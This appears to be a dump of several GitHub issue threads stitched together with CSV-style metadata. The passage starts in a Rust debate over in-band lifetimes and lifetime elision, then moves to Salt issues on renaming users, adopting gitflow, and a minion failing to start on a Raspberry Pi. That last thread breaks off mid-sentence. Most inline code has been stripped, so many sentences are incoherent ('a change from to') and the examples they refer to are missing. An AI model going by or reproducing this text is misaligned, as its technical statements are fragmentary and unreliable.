that happens to have the same name as an inner one--now it will silently be converted to the outer one.  Hopefully that will be nonsensical and the compiler will yell at me then, but if it makes a kind of sense, but not the sense that I intended, then it won't be caught; and even if I'm yelled at, I might not recognize the source of the problem unless I'm extremely solid on how lifetimes work. This makes me suspect that after a year or so, the conventional wisdom, backed up by linting tools, is going to be ""always declare lifetimes explicitly"". I think the anon lifetimes are great, but I'm nervous about this one.  Probably too late for bikeshedding, but it would be way safer if you could where  means ""the lifetime of "", which is syntactic sugar for the long version with lifetime parameters.  Yes, that drags you into dependent types, but I think it better matches the intent, is harder to get wrong, and is more lightweight syntactically (at least if you don't need to keep referring to the lifetime in the function body).  This elision is pretty cool As it removes a clearly redundant copy of . It is a clear win, because there still is one copy in the , so clarity of the explicit relationship isn't lost. However, I feel that on function level the elision doesn't pull its weight. It seems inconsistent, because there's  without any  it belongs to. If these were variable declarations, it'd be change from to so the first case becomes obvious as it should, the second case is WTF.  You don't have an  if you are writing something like . Moreover,  can still be nested, so the provenance of a given  is still murky. However, that nesting is pretty rare so maybe it's an acceptable loss in code clarity.  Also, part of the motivation of these changes is to get people to stop naming every lifetime 'a or 'b. I think it's important that we explicitly encourage people to start using more meaningful lifetime names like 'foo/'inner/'impl/whatever alongside encouraging them to use in-band lifetimes, not only because that was part of the reason we did this in the first place, but also because better names would mitigate most of the legitimate disadvantages of in-band lifetimes.  Has this been effective at changing people's naming?  Have any of the crates using it decided to change the names from  because of it?  The example up thread doesn't seem to have done so   (Thank you for posting, @friend!) I look at that example (and the one below it) and don't think ""this is better"".  Nor do they seem like they'd be better with names that aren't just .  The former needs to put it on everything, so in a way seems like it wants a different elision rule that gives all the arguments the same lifetime as the output, and any longer name would just be noisy.  The latter really wants lifetime-of-named-argument, since using a longer name feels even more repetitive on the argument .  Going to the return just being  would be helpful, but overall a change from  to  feels overall just ""meh"" to me. (I do really like that  let this change from  to just , but that's not in-band lifetime declarations, more like an expansion of elision.)  Is there talk of stabilizing that usage of ? (I know there is another part of , where you'll be required to change things like  to .) It sounds like that's being left out of the current FCP.  It seems like what's missing is a way of visually distinguishing local in-band lifetimes from outer lifetimes. Suppose we allowed lifetimes to be declared with two apostrophes  (semantically equivalent to ). We could then make it bad style to declare local lifetimes with a double apostrophe or something like that. Alternately, we could make it convention to name locals with a  prefix or some other naming convention we can lint on.  Found a bug with this feature that IMO should block stabilization  @friend concern lint This should not be stabilized until we have the lint that ensures a simple typo doesn't become an undeclared single-use lifetime.  I've written up my experience migrating  to the new system here. It's a rather long post -- however, I've tried to summarize my general feeling at the top.  Nice work! One quick response to the stuff about - the reasoning behind not eliding it (in e.g.  as opposed to the currently-allowed , without any  at all) was to align type-parameter lifetime elision with reference lifetime elision. It's supposed to play the same role as  in pointing out ""there's some lifetime here, but it comes from the usual elision rules."" The point about  looking like some special -like lifetime is worth considering, though- I don't know that it came up in the RFC thread.  Right, the point I was trying to make is that the &amp; already indicates that so any additional indication isn't required/helpful.  But the &amp; doesn't signify that. &amp;Mir doesn't tell you whether Mir has a lifetime parameter, and if it does, it might be &amp;'a Mir&lt;'a&gt; or &amp;'a Mir&lt;'b&gt;. I think that  is well-established as being irrelevant and unique in other parts of the language, like  and  so I'm not too concerned about ' being misinterpreted. What worries me more is the parts about losing context of where lifetime parameters are introduced. On Thu, Jul 19, 2018 at 600 PM, Mark Rousskov notifications@friend.com wrote  The following code compiles with the in-band lifetimes feature Now suppose that somebody wants to add the following function to the  block In order to do that, he/she may change  into , unaware that the impl block already contains a function that uses a lifetime named . The code then becomes Compilation fails with an error that points to a place that is unrelated to the change I would like to be able to add a lifetime parameter to an impl block without having to check manually if that would ""hijack"" a lifetime already used in a method in that impl block. This problem (and other problems related to not being able to tell at a glance where a given lifetime is comming from), may be mitigated by adding a lint-protected naming convention for lifetimes. If I am correct, there is currently no consensus on what that lint should do. If we stabilize this feature before we have such a consensus, we risk that this lint is never implemented (because we fail to reach consensus) and that problems like the one mentioned above will stay. I would like the team members to consider if this risk can be accepted before deciding on stabilization.  @friend asked me to post the patch to librustc_mir as a PR; if you're interested feel free to leave comments on it ( TL;DR I like everything about the lifetime syntax in Rust 2018, except named lifetimes coming ""out of thin air"" because they disrupt the flow of the reader. We should extend lifetime elision rather than elide lifetime declaration. Initially being a huge fan of in-band lifetimes, after using them I've come to believe that they're wrong solution for a problem worth solving. Lifetime elision, the first step in making lifetimes more ergonomic, was an elegant solution that eliminated something like 95% of lifetime declarations in functions. Then we got anonymous lifetimes in the form of , which I really like and find useful. The final step is eliding lifetime declarations, but I fear the drawbacks outweigh the benefits. The main drawback is that by reading a method signature it's not obvious where lifetimes come from. When reading code, in-band lifetimes disrupt my flow, which is the opposite of being ergonomic. My feeling is that instead of eliding lifetime declarations, we should extend lifetime elision. Let's consider an example Lifetimes  and  are simply noise so we can make them anonymous This is much better. Unimportant lifetimes are removed. And the fact that  and  were actually declared here tells us that they (probably) bind some references together. This is useful information when reading code, and it's not terribly annoying to type either. Here's another example that I recently used in  Lifetime  doesn't tie any references together (i.e. it's unimportant) so we can just make it anonymous This is still very readable (I'd say even more so) and quite a bit easier to type. Recently I've been fixing soundness issues in  due to incorrect lifetime bindings. Here's a corrected version of the declarations that used to be the problem There's a lot of stuff going on in here, but we can immediately see that  is declared here (used only in ), while  is coming from the  above. After fighting with very tricky bugs in this relatively small file, I appreciate explicit lifetime declarations very much (but only declarations of important lifetimes that tie references together). I'm also concerned about learnability. It has been argued that in-band lifetimes would help in the pre-rigorous stage of learning Rust. But I feel it's the opposite. Consider the following code If I were still learning lifetimes in Rust, my immediate question would be Is lifetime  in  and  the same lifetime? Answer no, unless both functions are inside an  that mentions . Another example My question would be Are types  and the  different? If the second function used , would the two  be the same type? It's confusing, IMO. But if  and  were assigned to these functions then it'd be clear that those lifetimes are only relevant to each specific function. Also,  signifies that lifetimes are inputs to the function. Input lifetimes and types go inside , while input values go inside .  Thanks, @friend!  Definitely nice to see more examples with pervasive lifetimes. @friend concern no lint suggesting underscore lifetimes (when in-band is off) This is very similar to  but I think my feeling is slightly different.  Most of the migrations I see have a bunch of changes that are actually about , making me think that we need more experience with only having that before taking the next step. As an example,  ♠diff impl&lt;'cx, 'cg, 'gcx, 'tcx&gt; ConstraintGeneration&lt;'cx, 'cg, 'gcx, 'tcx&gt; { impl ConstraintGeneration&lt;'cx, 'cg, 'gcx, 'tcx&gt; {  @friend concern in-band ambiguity From the discussion so far, it doesn't seem like anyone's made a strong case (practical evidence, or reasoned argument) addressing the numerous concerns both here and in the original RFC for the inability to identity in-band lifetimes versus parent lifetimes, and the learnability issues that poses. The current attitude seems to be ""let's add some lints to try to avoid common mistakes"", but I think an important question to ask might be ""If we need to add these lints in order to avoid common foot-guns, then is this really the right solution?"" The feeling I've got from reading people's experiences with in-band lifetimes is that they don't offer significant benefit compared to other lifetime convenience features, while opening up potential for confusing mistakes, especially for beginners. This also seems quite early to be pushing for stabilisation. The 2018 preview was announced a month ago and while the features have been available for longer, there wasn't a big push to get feedback until then. Since the RFC was implemented to see what the user experience was, it seems overly-eager to be saying that we have enough information now (at least, I've only seen a handful of more detailed feedback about the feature so far).  The lifetime elision in impls feature seems less dangerous, as the declaration of a lifetime is less ambiguous there, though it potentially has the same problem as in-band lifetimes if modules can ever be parameterised by lifetimes.  It seems to me that, while in-band lifetimes might look nice by analogy to OCaml/Haskell-style type variable syntax, the problems we're finding with them are largely due to the far greater use of nested parametric items in Rust. Further, the examples of the extended elision and  we're seeing already increase clarity and simplicity quite a bit. They may still have the  syntax to introduce the named lifetimes, but they can still remove it entirely in some cases and when it remains it helps combat the nesting ambiguity more effectively than a lint. So while in-band lifetimes still seem like a win to me in non-nested situations, that's probably not enough to warrant including them.  Back in the RFC thread some people (spoilers one of them was me) were arguing that  lifetimes and  lifetimes should use strictly disjoint sets of identifiers (e.g.  lifetimes are uppercase and  lifetimes lowercase, as was originally proposed) for greater clarity. (""Enforced"" by a lint, or whatever.) The official position at the time seemed to be that it wasn't clear if there was sufficient motivation. I think the comments above mine provide some.  I didn't get the impression that there was insufficient motivation- the lint was planned from very early on. AIUI the issue was rather which convention to pick, and whether it was sufficient. (For instance, I don't like upper/lowercase because it seems to imply qualitatively different sorts of entities, but the competing idea of single-character vs meaningful-name is less enforceable.)  After reading the post by @friend I'd prefer to not get this feature. I didn't realize it before, but in-band lifetimes are similar to implicit variable declarations (no ) which languages like CoffeeScript have. I think that explicit declarations are especially valuable when we have lengthy code. Lifetime declarations aren't bothersome to write but in nested situations they add the little bit of clarity that can be crucial to understand the code correctly or understand it faster because we can see precisely where each lifetime is introduced.  Despite my agreement that we may not want in-band lifetimes, I would like to push back against the idea (already discussed quite a bit earlier) that the problem is with ""implicit declaration"" per se, should the opportunity arise to consider this pattern elsewhere. It's primarily the nesting and shadowing that causes the problems here- without that, the situation is nearly identical to ML-style type declarations or Prolog-style patterns, which both a) are quite nice to use and b) fit well with the way lifetimes are used.  PR to split the feature gate between the named and elided parts  thing I noticed in passing, while I'm still skeptical overall, I really like this symmetry  I'm not sure how to turn that aesthetic feeling into a coherent proposal...  Hey, I would like to give you guys some feedback about this. I think the place I am most using lifetimes is in some LLVM wrappers from a project of mine (for self-learning purposes). Well, so far I had no problem on lifetimes, I mean, I haven't found bugs yet. I would like to say I really enjoyed the idea of making lifetimes look like ""annotations"" on the code. After all, that's what they really are. Correct me if I am wrong, but they are annotations of relationship between references (and structures containing references, etc.). The only concrete lifetime is . Also, generic code on references is not monomorphized as with regular types. I think makes sense having a different treatment.  I'm having some problem figuring out what thing deallocates what, so please, don't pay attention on code correctness.  But well, I see the discussion is inclining into not stabilizing in-band lifetimes. I have to agree about shadowing. Anyway, I just wanted to give some feedback.  FYI, I've P-FCP'd the non-in-band parts of this over in  Since it came up in reddit as well I'll mention one downside to the current idiom lint. It recommends using anonymous lifetimes on input types that are already behind references, for example on  This was a massive diff when I tried applying the idiom lints to  because it turned all the future implementations into The first  in  seems useful because it's non-obvious that  is a reference type. The second one in  seems superfluous because the  is already limiting the lifetime of the parameter to this function call. There may be cases where having an explicit parameter here is useful, but I don't think this case is as useful to lint against as most of the other cases this lint targets. (EDIT note I wrote the  implementation from memory, it was a while ago I tried running the lints against . I'm not certain that it actually added the lifetime to , but if it didn't that's just likely to be a bug in the interaction of the lint and arbitrary self types.)  @friend I assume by your link you mean this version of  (now deleted)? You might like #52461 (which also made extensive use of in-band lifetimes).  @friend IMO the idiom lint shouldn't apply to  because it's ""a custom reference type"". (a library analogue of a sigil, if you will)  To me, lifetimes on input types that are not connected to anything are just noise We could rewrite @friend's examples in a similar fashion as Perhaps the lint should warn only of cases where hidden reborrows really are occurring and permit elision otherwise?  @friend I guess the condition you're after for that distinction is ""is this lifetime used in more than one place after elision?"" which should be really easy to check in the compiler!  @friend That's right. So the motivation for explicit lifetime parameters was (from the language ergonomics blog post) My thinking is that we should warn of elided lifetime parameters that participate in reborrowing, but not complain when they do not.  Minor nit I don't see why ""reborrowing"" is used in that blog post. This is just whether elision used the lifetime or not, I'd call it a ""lifetime relationship between input and output"", not ""reborrowing"".  @friend would you say the lint shouldn't apply to  or  either since they're fundamentally just custom reference types with extra invariants as well? If so, should the compiler be automatically recognising these types, or would it need some form of annotation?  @friend I now prefer @friend's interpretation, which is far more general.  Yes (I like that too), but it's orthogonal, there are still situations where  could fall under the the lint, e.g. in a signature like  @friend I that case it seems fine, if we're going for ""should be explicit because elision used it"" (I almost want to apply that rule to  too, since it should be less verbose and maybe worth it) (nevermind, one of the original goals of elision was to allow writing literally ).  Perhaps  or some other attribute can be used to indicate that implicit lifetimes are ok?  I find the  example highly persuasive, and agree that seeing the lifetime there is unhelpful. So if I'm understanding things right, then the proposed rules would be  In output position, all lifetimes must be obvious (named, , or there because of ) In input position, only the lifetimes used in the output must be visible (at most one, if using elision)  (Hmm, I think that would also mean that things like  should work, without requiring  the way that  does.)  IMO, this is really weird and confusing.  should be unique every time, just like  in patterns. Why are we allowing it to be used to connect lifetimes?  Yeah,  is a bit confusing when first learning it. But as a general rule It behaves the same as elided lifetimes in references. So your example is akin to  where the lifetimes are obviously connected.  I still think that's harmful to understanding/learning. For example, let's say I read the chapter about elided lifetimes, and then I go write a match match (a, b, c) {     (, 2, ) =&gt; { println!(""a == c"") } // bug     ... } Why does  work differently here? It's inconsistent. Lifetime annotations are already ""a bit confusing when first learning"". If we're going to clutter up the syntax, it'd better be a vast improvement. On Mon, Aug 20, 2018 at 201 PM Christopher Serr notifications@friend.com wrote  @friend That ship has already sailed. The following is valid code in stable Rust now I don't think so;  is not necessarily unique in patterns. So  means ""something goes here, but I'm too lazy to give it a name"". That something might or might not be equal to something else. It just doesn't have a name, that's all. The same applies to anonymous lifetimes. And lifetime elision just means the compiler tries to infer the obvious relationships between input and output lifetimes whenever possible, or ask the programmer for help in ambiguous cases.  Hmm. I haven't had time to fully catch up on this thread. I feel wary, though, of giving up on the ""use  everywhere a lifetime would appear"" rule. I feel though that there is value in having the struct declaration () match up closely with references to the struct (). That said, if I recall I made similar arguments to @friend some time back, basically claiming that the most important thing was to highlight that there is some reference somewhere. I think somewhere along the line my opinion shifted, but maybe it can shift back. =) I think for me personally Having some sign that a reference has been elided in a return value is absolutely necessary. I am confused on a regular basis by things like the  that appears here in the compiler  an indication that ""lifetimes appear in this type"" in parameters feels helpful. I definitely scan parameter lists visually in order to get a feeling for whether I will be able to easily copy or move that value into a struct etc, or whether I can easily refactor away from  to . Knowing that  itself contains references makes a difference there. I know I've been tripped up by this before (thought I could do something that turned out not to work); I'm not sure how important it really is. Finally, it's a minor point, but having explicit  is really useful in error messages, since we can highlight that  and talk about it but we've already got some other solutions there (e.g., printing the type), since sometimes we don't have a type at all.  Can this issue perhaps be split into multiple ones? I'm not quite sure what exactly is tracked by it right now. The  and  looks good to me, but I never set my ticky box due to ""define-on-use"" for lifetimes, which are not aligned with fundamental priorities of the language as I see them. Those priorities include reliability of code and its resistance to accidental mistakes, which are especially important for large projects written and extended by many people often unfamiliar with code they are changing. For lifetimes such separation of def and use provides duplication necessary for error detection during  addition, removal and renaming of lifetimes in impls/traits, impl/trait items and perhaps lifetime-parameterized modules in the future.  @friend I thought it was already split?  is already stabilized (#48469) and  is in #15872.  I propose we cancel this p-FCP for now.  It seems like it's de facto not landing for the edition.  We can wait to gain more experience with additional lifetime elision, as @friend suggested, before reconsidering it. A bunch of situation for  in libcore  @friend There are also types for which writing lifetimes in parameters is not that helpful      All these types are reference types by nature, so it's kind of obvious they contain lifetimes. No need to write them out. We could argue in the same vein that the lifetime in  is not helpful because we already know every reference contains a lifetime. But since  is just syntax sugar for , we could say that for other reference types it's obvious they contain lifetimes, too. Of course, with types like  it's not obvious they contain lifetimes unless we write them out. But I also never cared about  having a lifetime so the  will only be annoying to type. I admit that lifetimes in types do come up useful in some cases. But, personally, I feel that the drawback of verbosity outweighs the benefits. One of the things I first hated about Rust is that I had to parametrize structs by lifetimes if they contained references. Storing a reference inside a struct felt like a punishment I have to write so many lifetimes now, should I have used clone or  instead? I worry that requiring lifetimes will only make the punishment worse. And references should be encouraged, not discouraged. Also, my attitude towards lifetimes was generally (and still is) I'd like to elide lifetimes as often as possible, but I don't mind helping out in the rare cases where things require assistance. This is one of the cases where I feel like the compiler wants too much help (yes, it's only for the benefit of the reader, but still).  @friend fcp cancel  @friend I wonder to what degree the problem here is just ""bad"" syntax -- the  is pretty unwieldy. As to whether it's obvious whether the types you mention contain references -- I think there are a lot of times where that's not the case, for example when you're working with an unfamiliar code base, or just don't happen to be thinking about that question and hence don't catch the borrowing implied by a signature. I personally do find a visual signal of some kind to be quite helpful, but am sad that we weren't able to find something more appealing and lightweight.  @friend That's the only problem really  is far more unwieldy than . We tried using  everywhere in  (see #53816), but I'm not sure the end result is great. Signatures like these are not pretty I appreciate the usefulness of explicit lifetimes here, but considering the verbosity they don't seem like a net win to me. YMMV, though. My main worry is that the proliferation of lifetimes will be a step back for ergonomics and that we might have to write lifetimes more often in Rust 2018 than in Rust 2015. I'm not sure if that's really true, but it'd surely be unfortunate.  I'm of two minds about this I personally think it's really helpful as a reader to be able to see which types have lifetimes in them, and I like seeing . However, I am scared that we're making lifetimes ""noisier"" which will have the potential to frustrate authors and make them use owned types instead in order to avoid sticking  everywhere.  I still think we should make the rule ""you have to only write out lifetimes (even just ) if they're used more than once"" (i.e. elision picks them up). Why? Because only then do they become lifetime relationships. Otherwise, the function is quite universally quantified over them, which is pretty boring.  @friend My concern with that approach is that there's another aspect of ergonomics at play being able to easily remember what is required where. To me, it seems much easier to remember that  always gets a lifetime than to use it only in select circumstances. While  is stable, for the 2018 Edition we could consider scaling back the lint, at least initially. I'd really love to hear from @friend here; he's been pretty outspoken about this in the  past.  I want to speak up in favor of having some signal that there are ""hidden lifetimes"" in types. The current notation of  is not my favorite, but I don't yet have a compelling alternative. What I find is that I am constantly wanting to know whether a type contains references or not. It tells me a lot about how the type can be used types without lifetimes can be cloned or copied and stored for arbitrary amounts of type. Types with lifetimes are always temporary in scope and confined to some caller (modulo longer lived arenas like  in the compiler, which are the exception, and also readily identifiable). In the specific case of a type that appears in the return value, I find it invaluable to know if there is an elided lifetime within, since it tells me how long the borrow on  will last. I suspect that I derive outsized value from this notation because my intuitions for this stuff are stronger than most (can't imagine why that might be). But I feel like having a consistent syntax that highlights where lifetimes are and where they are not might wind up being very important for helping other users to develop these annotations. OK, let me give a few examples that I've run across recently. Just yesterday I was reading into the futures code and I saw this Now, I know that a  is an accumulation of bits of state. But I inferred from this signature that this state must not have any references associated with it and hence must be owned by . This seemed surprising to me. But when I clicked through to the definition, I saw that I was mistaken, and that indeed the  type carries references  to make matters worse, rustdoc actually hides these references, so it's actually quite hard to figure out what is going on. Anyway, then I kept reading, and I encountered this signature Here, I was confused for quite a while, because I misremembered that  carried a ""hidden"" lifetime (in fact, it was ). I knew that somehow  was supposed to ""store away"" a copy of the , so that it could notify the executor when it should be rescheduled, but I couldn't figure out how that was possible, since  carried references. It took some time for me to realize that I has misremembered and that  does not have references, so you can clone it and not be tied to any active borrow. Another example comes from the rustc source, which for a long time contained a function like this It happens that  holds a reference into , so this borrow will last as long as the return value is in use. But could you guess that? This same principle applies to compiler error messages. There, it's quite nice that we have something we can highlight to show you which reference we are talking about. e.g., we can now give errors like this Here, I imagine that we can find other solutions (and in general I'd like to work on improving these messages in lots of ways), but in general having a visual signal for where references are will always be useful to us, I think. As far as consistency goes, I think there is value in trying to close the gap between the various ways that you write types in Rust. Right now, types that appear in function signatures and those that appear in struct declarations sometimes look really different (e.g.,  vs ). If we have , then there is at least a signal telling you ""when you put this into a struct, it's going to need lifetime parameters"". (I would still like to have some way to have a single anonymous lifetime parameter of a struct, so that one could write  as well, but that's neither here nor there.)  @friend I agree that this is not pretty, but I'm not sure that just a plan  is really better. I personally find it a bit ""surprising"" to see things like  without any parameters, since it is relatively unusual, and it makes my mind feel like something is missing. I suspect that for newcomers to rustc it might also be hard to remember what things have lifetimes and which do not, though it's hard for me to judge. Speaking personally, I find the  there ugly but I do find it serves a purpose. Without that, when I see , my mind pattern matches it with  or other such pointer types, and those two things are quite different. I think ultimately I agree with @friend's comment here  I should also add that I appreciate that typing  is kind of... challenging. It feels like the sort of thing where I want an IDE that, once I type , just fills in the  or something. )  @friend Did I miss a part of your comments, or did you not address the specific suggestion of only requiring explicit  when there is an implicit relationship (i.e. when elision is involved)? The elision aspect would cover that. And IMO I find that far more interesting than being able to tell whether a type is parametrized when looking at an universal function. I'd rather have IDEs and  provide an expanded version on hover, than have to write in all the lifetimes even in signatures where they're inconsequential.  @friend I did not specifically address that. I agree that is better than the status quo. It might be a good place to start, given the controversy of the more encompassing proposal. However, I don't find this to be true That is to say, I personally get a lot of value from knowing whether types are parameterized when looking at universal functions. Often, when somebody pings me with some lifetime error and associated source, the first thing I do is to spend a while figuring out ""where the lifetimes are"". Currently, this requires jumping through to the source of all the various types involved. I agree though that there is a cost of heavier notation.  Is there a lint that warns against elided lifetimes in types (I mean everywhere, not just in return position)? I'd like to see how much of an effect that has on a few projects I'm familiar with -- and if it's not too bad, it might change my opinion.  @friend try , I think that still has the full behaviour  Or even  (although I don't know if that can affect dependencies, given 's ""cap lints"").  Ok, I've just run the lint on all the  crates, , , and . Here's what I learned... The vast majority of the reported warnings are either missing lifetimes in return position or in . There are only a few remaining cases where we need to add lifetimes but it's no big deal, honestly. I'm pleasantly surprised by the low impact of the lint. Still, the large PR (around 550 lines were changed) submitted on  was making me feel uneasy. I thought maybe the code in  is a particularly bad example that uses lifetimes heavily. Then I went on to calculate the ratio of warnings per total lines of code in those projects. Perhaps  has a higher ratio of warnings per total lines of code? It turns out it doesn't - the ratio is not significantly higher. It's just that  is really big. I think my opinion has changed so allow me to make a 180 turn and give a 👍 for requiring lifetimes in all types. If anyone else is feeling unconvinced, I encourage you to do the same thing and try to assess the real impact of the lint.  In  this results in 511 warnings (from 15028 lines of code according to tokei). Scanning the output I'm relatively confident that every single warning is for an input parameter that is not connected to the output in any way, so would result in no warning for the ""explicit lifetimes when elided"" variant.  To be fair,  is a bit of a special case because almost all warnings come from  and . And there's a whole lot of  impls in there, which you're not supposed to implement by yourself anyway. Besides,  will soon become , which cuts the number of warnings down from 511 to 216.  And  will become , fixing the remaining half (see  Undeveloped thought (By analogy to  =&gt;  patterns.)  Hmm, this lint produces 1514 warnings on Servo's style component alone, and the fix looks a lot more verbose and ugly (  Most of them are actually unused lifetimes, as in, there's no relation with them and the output of the function... I think @friend's approach of only warning when elision actually comes at play it's way better than the current warning, getting the usefulness without the annoyance.  @friend I frankly disagree we need explicit lifetimes in that case.  Here's a related pet peeve of mine. Currently, this compiles But this doesn't Sometimes requiring  and sometimes not requiring it feels inconsistent. We should pick a side either require it or don't.  I wonder, would it be reasonable to stabilize only in-band lifetimes on functions (not methods)? AFAICT, there is no ambiguity about where those lifetimes come from, right?  To be clear, I mean that we would stabilize a useful subset now as long as it is future-compatible with the rest of in-band lifetimes.  I question whether partially adding such a feature simplifies anything, since even if one believes leaving out lifetime declarations is a good thing, we would actually be adding more rules about where that's allowed. And it still makes situations like the following harder to read. On Thu, Nov 15, 2018, 0003 Who? Me?! &lt;notifications@friend.com wrote  I came across this issue when converting my code to Rust 2018 edition. I have lots of code that elides lifetimes in parameters and the  tool suggested I make make changes to add explicit lifetime annotations. Consider the following Initial code My understanding is that omitting the lifetime parameters like that is deprecated and  rewrites  as However, then I generalized the initial code ( implements  so the generalized code really is strictly more general than the previous code) When I run , it doesn't make any lifetime annotations explicit in the generalized version; it leaves the code as-is. It seems really arbitrary to me to encourage the more generic code to elide the lifetime parameters but discourage the less generic code from doing so. In general, Rust programmers need to be able to understand generic code and that means that they'll need to understand that there are potentially unseen lifetimes arguments implicitly in play when a reference type is used as the concrete type in a generic context. I think encouraging explicit lifetimes in non-generic contexts is only going to make it harder for people to understand this. Also, over the course of maintaining my ""idiomatic"" code, I found that the unnecessary-but-idiomatic explicit lifetimes actually resulted in bugs. See  in particular. That bug wouldn't have occurred if I had used the old style of eliding the lifetime. Therefore, I think we shouldn't call the use of unnecessary (according to the compiler) explicit lifetimes ""idiomatic"". I hope this can be reconsidered before JetBrains CLion replaces its ""elide lifetimes"" quick-fix with what  does.  @friend The difference I see between those two is that  is already visibly generic and dependent upon a type argument that may have a non- lifetime. , on the other hand, has no visible parameters and so it may not be obvious that it could be non-.  Re- the new ""idiomatic"" way to write that signature is which makes it explicit that the passed  parameter has a lifetime, but that it is not involved in the output (same as  does semi-implicitly with the ). If  suggested to turn  into  there instead then that is a bug in the lint.  What's the situation wrt. ""implicit shadowing"", between implementation and desired behavior? I was expecting this to error Just like this does With such an error requiring , we reserve the right to inherit generic parameters (both  and ) in nested items, without existing code changing behavior.  The RFC says an error to mention lifetimes from that outer definition (without binding them explicitly). This is again intended for future-proofing and clarity, and is an edge case. Apparently this future-proofing wasn't implemented. ",195,69,1647,0,0,823,54,
saltstack/salt/15511,0.100887335,saltstack,salt,Add a function to rename user,3971,49,27,0,1,"Please provide a function to rename OS users. In GNU/Linux this can be done by using . See  I think that OS X uses similar attitude. It should be possible to rename user in Windows either (I've done it using Control Panel). After adding this function,  state should not fail if user provides  that is already used by the user with different name, but rename the user.  Seems very reasonable, thanks for the request.  Looking into this.  Looks pretty straightforward, only question will be Windows.  Might need to consult with @friend  Only implemented functions to rename user.  Need to think about the changes to the state function.  Right now it attempts to run the respective add and if it fails reports back that the user add failed.  We could at that point attempt to rename the user but would need to know that it failed because of something like UID already existing.  I'm actually not convinced that we should change the state.  I feel like we're assuming too much at that point -- if we accidentally put in a UID that already exists, it's going to rename the user?  That seems like asking for trouble.  If we want to add renaming to the state, we should hide it under a new argument.  I was thinking about including an additional argument to the present function, rename or rename_on_fail or something, but you're right it opens up a whole can of worms for potential error cases.  Maybe just adding a new state function to rename users and make the error reporting on a failure in the present function better about reporting that the UID already exists for another user.  I just feel like renaming users is one of those things that's just not designed to be idempotent.  I feel like if you need to do a user rename, you use remote execution () out of band of your states.  But maybe there's a case for allowing it within states.  Not totally sold on the idea either.  The rename function is now in develop, we could let it sit and see if that meets the need, then revisit the second part of this request if the use case arises.  Agreed.  I am going to close this as resolved for now, pending further discussion.  Wait, wait! Use case I've prepared an image of openSUSE distribution for programmers of the company I'm working at. I've included default user named 'programmer'. But I want real username and hostname, based on this username. After the first load AutoYaST + my scripts ask username save it into grains ( requires user), makes appropriate hostname and , and starts salt. Salt renames user and manages files. I think shipping image without users at all and creating first user using salt would be inflexible, because I couldn't even load X11 if salt don't create user (due the lack of connection, for example).  Do you have to rename the user?  Couldn't you simply create the new user for the person who will be using the machine?  Just after the answering to AutoYaST questions openSUSE loads with the  user. That means that the home directory is populated with files. I don't need this directory. Well, I can delete the user (and the home directory) via additional state, but I cannot do it while this user is running KDE. Also my state assumes that home folder of the real user is already in a correct state, but that's not true until I login to the KDE for the first time. Also KDE don't want to load if it finds some files under the  directory. That means that I need to reboot the machine manually anyway before my highstate. And one more thing some distributions (including openSUSE) disable auto login when there are multiple users in the system. I don't want that. You see, it's not so simple, as it appears on the first blush.  So at that point I would lean towards using  with an  I still don't think it's something that necessarily belongs in the  state.  (I will also note I haven't actually looked at @friend's new rename code, so I'm sure the above example uses the wrong argument names)  Pretty close )  old = name and new = new_name. ",18,0,121,0,0,114,4,
saltstack/salt/236,0.105497141,saltstack,salt,start using gitflow,1820,15,38,0,2,"Hi Thomas, I want to make progress... gitflow [0] is next thing to attack. Here's how to do it... it's trivial as you can see (of course, you don't clone but use the orig repo) sa@friend/tmp$ git clone  into salt... remote Counting objects 7943, done. remote Compressing objects 100% (2398/2398), done. remote Total 7943 (delta 5480), reused 7907 (delta 5450) Receiving objects 100% (7943/7943), 1.22 MiB | 756 KiB/s, done. Resolving deltas 100% (5480/5480), done. sa@friend/tmp$ cd salt/; git branch -a * master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/highstate   remotes/origin/master (master u=) sa@friend/tmp/salt$ git flow init -d Using default branch names.  Which branch should be used for bringing forth production releases?    - master Branch name for production releases [master]  Branch name for ""next release"" development [develop]   How to name your supporting branch prefixes? Feature branches? [feature/]  Release branches? [release/]  Hotfix branches? [hotfix/]  Support branches? [support/]  Version tag prefix? []  (develop) sa@friend/tmp/salt$ git branch -a * develop   master   remotes/origin/HEAD -&gt; origin/master   remotes/origin/highstate   remotes/origin/master (develop) sa@friend/tmp/salt$ git push -u origin develop  Finally go to github's admin interface for salt and make develop the default branch. We're done... best of both worlds, stable master from now on, no more direct pushes to master plus we can keep the attitude of fast progress/experimenting because wild coding monkeys can start feature branches and fire away ) [0] on Debian  or from source  markusgattol, I am all for this, and it is the next thing I will set up. Sorry I have been slow on the uptake, been a busy couple of days!  branch was created on the 17th and set as default in GitHub -- closing. ",5,0,150,0,0,40,8,
saltstack/salt/24955,0.09148816,saltstack,salt,Minion fails to start after bootstrap on Raspberry PI,7527,83,75,0,6,"After bootstrap trying to start Version I also tried with an empty minion config, but the problem remains. I am assuming(ohoh) that it should work out of the box after bootstrapping. Am I doing something wrong ? Or doesn't this version work on a PI ?  @friend, is there another minion process running when you try to start a new process?  @friend , no there is not. Just to be sure, i double checked.  @friend, this looks like a really strange issue.  Salt itself is as portable as python, so as long as its dependencies are installed, it should work.  The best I can think of is that there may be a dependency problem that is causing the minion process to erroneously loop as you've demonstrated.  Is there any more interesting output with ?  Also, will you post the output from ?  Thanks.  @friend, would you mind posting the output from  and ?  Thanks.  (Also, this was output 3x during bootstrapping)  There may be some dependency, upstream issues here.  Salt is pure python and I'm sure nothing in python or its standard lib could cause an .  It may be that a raspberry pi (at least an older one) may be too underpowered to run a salt minion, but I am doubtful of this.  I have been able to successfully run a salt minion on hardware with lesser capacity.  I have observed the same behaviors during a reinstall on a previously-working Raspberry Pi B+. Previously I installed a Salt minion on the Pi on 2015-02-22 (I believe I also upgraded it via apt-get on 2015-04-06 although it's unclear from my notes if the new version ""took effect"" or not).  ((EDIT 2015-09-07) Regardless of whether the oldest version was still running or not, it was definitely talking to the Salt Master.) Due to filesystem corruption, on 2015-08-15 I was forced to reformat and reinstall the OS (NOOBS v1.4.1), and I noticed that running  seemed to hang no response, but no error.  Since then I've been trying various combinations of installing and reformatting, and even upgraded the Salt master, but the minion is not working properly and displays many of the behaviors commented above. For demonstration purposes, I begin with Download and install the bootstrap script Run the installer using  and it does a bunch of stuff before ending I then try (unsuccessfully) to confirm the versions of the installed software (I hit CTRL-C after about a minute of waiting) Attempt to stop the minion and restart in debug mode Eh?  It's still running? Force quit, confirm it's not running Now run the minion in a debug mode (hit CTRL-C after several minutes) Checking the contents of  shows the following Note the presence of warnings about  as was mentioned by others in this thread. During debugging, at various times I too received errors about ""Illegal operation"".  At the time I thought I had debuged that to be a matter of not 